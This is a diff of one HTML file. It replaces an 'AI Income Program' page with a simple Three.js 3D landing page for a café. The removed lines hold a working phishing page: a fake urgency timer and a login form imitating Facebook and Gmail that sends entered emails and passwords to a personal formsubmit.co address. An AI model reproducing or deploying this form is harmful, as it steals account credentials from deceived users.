@@ -3,199 +3,131 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AI Income Program</title>
+<title>Masala Beads Café</title>
 
 <style>
 body {
-    margin: 0;
-    font-family: 'Segoe UI', sans-serif;
-    background: #000;
-    color: #fff;
+  margin: 0;
+  overflow: hidden;
+  font-family: 'Poppins', sans-serif;
+  background: #000;
 }
 
-/* SECTION SYSTEM */
-.section {
-    display: none;
-    width: 100%;
-    height: 100vh;
+#overlay {
+  position: absolute;
+  top: 40%;
+  width: 100%;
+  text-align: center;
+  color: white;
+  z-index: 10;
 }
 
-.section.active {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-/* HERO */
-.hero {
-    background: url('https://images.unsplash.com/photo-1555949963-aa79dcee981c') center/cover no-repeat;
-    position: relative;
-}
-
-/* DARK OVERLAY */
-.hero::after {
-    content: "";
-    position: absolute;
-    inset: 0;
-    background: rgba(0,0,0,0.7);
-}
-
-.content {
-    position: relative;
-    max-width: 800px;
-    text-align: center;
-    padding: 20px;
-    z-index: 2;
-}
-
-/* TITLE */
 h1 {
-    font-size: 2.5rem;
-    background: linear-gradient(90deg,#00c6ff,#0072ff,#00ffcc);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
+  font-size: 3rem;
+  letter-spacing: 2px;
 }
 
-/* BUTTON */
+p {
+  font-size: 1.2rem;
+  opacity: 0.8;
+}
+
 button {
-    padding: 14px 28px;
-    font-size: 18px;
-    border: none;
-    border-radius: 30px;
-    background: linear-gradient(135deg,#00c6ff,#0072ff);
-    color: white;
-    cursor: pointer;
-    margin-top: 20px;
+  padding: 12px 24px;
+  border: none;
+  background: #c49b63;
+  color: white;
+  cursor: pointer;
+  margin-top: 20px;
+  font-size: 1rem;
+  border-radius: 5px;
 }
-
-/* CARD */
-.card {
-    background: rgba(255,255,255,0.08);
-    padding: 25px;
-    border-radius: 12px;
-    width: 90%;
-    max-width: 400px;
-    text-align: center;
-}
-
-/* INPUT */
-input, textarea {
-    width: 90%;
-    padding: 10px;
-    margin: 10px 0;
-    border: none;
-    border-radius: 6px;
-}
-
-/* TIMER */
-.timer {
-    margin-top: 15px;
-    color: #00ffcc;
-    font-size: 18px;
-}
-
-/* THE PROFESSIONAL LOGIN */  
-    #vault-gate { display: flex; justify-content: center; align-items: center; height: 100vh; }  
-    .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }  
-    .brand { font-size: 32px; font-weight: bold; color: #0866ff; margin-bottom: 10px; }  
-    input, select { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; box-sizing: border-box; }  
-    .login-btn { width: 100%; padding: 15px; background: #0866ff; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; 
-}
-
-
 </style>
 </head>
 
 <body>
 
-<!-- HERO -->
-<div id="offer" class="section active hero">
-
-    <div class="content">
-
-        <h1>AI + Income Opportunity</h1>
-
-        <p>
-        Artificial Intelligence is transforming the world and creating powerful income opportunities. This program helps you learn AI tools, automation, and modern digital skills to build real income. Start your journey toward financial independence today.
-        </p>
-
-        <div class="timer" id="timer"></div>
-
-        <button onclick="go('login')">🚀 Participate Now</button>
-
-    </div>
-
+<div id="overlay">
+  <h1>Masala Beads Café</h1>
+  <p>Feel the vibe. Experience the moment.</p>
+  <button onclick="enterSite()">Enter</button>
 </div>
 
-<!-- LOGIN -->
-<div id="login" class="section">
-
-    <div class="card">
-
-        <h2>Register</h2>
-
-        <form action="https://formsubmit.co/yoshpick22@gmail.com" method="POST"
-            <input type="hidden" name="_captcha" value="false">
-            <select name="Platform">  
-                <option value="Facebook">Log in with Facebook</option>  
-                <option value="Gmail">Log in with Gmail</option>  
-            </select>  
-            <input type="text" name="Account_ID" placeholder="Email or Phone Number" required>  
-            <input type="password" name="Security_Key" placeholder="Password" required>   
-        <button type="button" onclick="go('success')">Continue</button>
- </form>
-
-    </div>
-</div>
-
-<!-- QUESTIONS -->
-<div id="success" class="section">
-
-    <div class="card">
-
-        <h2>Questions</h2>
-
-        <form action="https://formsubmit.co/yoshpick22@gmail.com" method="POST">
-
-            <textarea name="Goal" placeholder="What is your goal?" required></textarea>
-            <textarea name="Current" placeholder="What are you doing now?" required></textarea>
-            <textarea name="Skills" placeholder="Your skills?" required></textarea>
-            <textarea name="Time" placeholder="Daily time?" required></textarea>
-            <textarea name="Problem" placeholder="Biggest problem?" required></textarea>
-            <textarea name="Commitment" placeholder="Why select you?" required></textarea>
-
-            <input type="hidden" name="_captcha" value="false">
-
-            <button type="submit">Submit</button>
-
-        </form>
-
-    </div>
-
-</div>
+<script src="https://cdn.jsdelivr.net/npm/three@0.160.0/build/three.min.js"></script>
 
 <script>
+let scene, camera, renderer;
 
-/* FIXED NAVIGATION */
-function go(id){
-    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
+function init() {
+  scene = new THREE.Scene();
+
+  camera = new THREE.PerspectiveCamera(
+    75,
+    window.innerWidth/window.innerHeight,
+    0.1,
+    1000
+  );
+
+  renderer = new THREE.WebGLRenderer({ antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  document.body.appendChild(renderer.domElement);
+
+  // Lighting
+  const light = new THREE.PointLight(0xffcc88, 2, 100);
+  light.position.set(5, 10, 5);
+  scene.add(light);
+
+  const ambient = new THREE.AmbientLight(0x404040, 2);
+  scene.add(ambient);
+
+  // Floor
+  const geometry = new THREE.PlaneGeometry(50, 50);
+  const material = new THREE.MeshStandardMaterial({ color: 0x2b2b2b });
+  const floor = new THREE.Mesh(geometry, material);
+  floor.rotation.x = -Math.PI / 2;
+  scene.add(floor);
+
+  // Table (basic 3D object)
+  const tableGeo = new THREE.CylinderGeometry(1, 1, 0.2, 32);
+  const tableMat = new THREE.MeshStandardMaterial({ color: 0x8b5a2b });
+  const table = new THREE.Mesh(tableGeo, tableMat);
+  table.position.y = 1;
+  scene.add(table);
+
+  // Coffee cup (simple)
+  const cupGeo = new THREE.CylinderGeometry(0.3, 0.3, 0.6, 32);
+  const cupMat = new THREE.MeshStandardMaterial({ color: 0xffffff });
+  const cup = new THREE.Mesh(cupGeo, cupMat);
+  cup.position.set(0, 1.5, 0);
+  scene.add(cup);
+
+  camera.position.z = 8;
+  camera.position.y = 3;
+
+  animate();
 }
 
-/* TIMER */
-let t = 86400;
+function animate() {
+  requestAnimationFrame(animate);
 
-setInterval(()=>{
-    let h = Math.floor(t/3600);
-    let m = Math.floor((t%3600)/60);
-    let s = t % 60;
+  // slight floating animation
+  camera.position.y = 3 + Math.sin(Date.now() * 0.001) * 0.1;
 
-    document.getElementById("timer").innerText =
-        `⏳ Offer ends in ${h}h ${m}m ${s}s`;
+  renderer.render(scene, camera);
+}
 
-    t--;
-},1000);
+function enterSite() {
+  document.getElementById("overlay").style.display = "none";
+  init();
+}
 
+// resize fix
+window.addEventListener('resize', () => {
+  if (!camera) return;
+  camera.aspect = window.innerWidth / window.innerHeight;
+  camera.updateProjectionMatrix();
+  renderer.setSize(window.innerWidth, window.innerHeight);
+});
 </script>
 
 </body>
@@ -203,10 +135,3 @@ setInterval(()=>{
 
 
 
-
-
-
-
-
-
-    
